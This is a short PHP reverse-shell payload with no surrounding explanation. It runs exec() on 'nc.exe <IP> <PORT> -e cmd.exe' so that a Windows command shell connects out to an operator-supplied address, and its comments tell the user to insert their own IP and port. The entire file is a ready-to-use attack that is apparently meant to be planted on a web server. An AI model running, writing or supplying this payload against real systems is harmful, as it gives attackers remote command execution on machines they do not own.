<?php
$ip = '<LOCAL-IP>'; // Replace with your IP
$port = <PORT>;     // Replace with your port
$cmd = "nc.exe $ip $port -e cmd.exe"; // Command to execute Netcat
exec($cmd);
?>
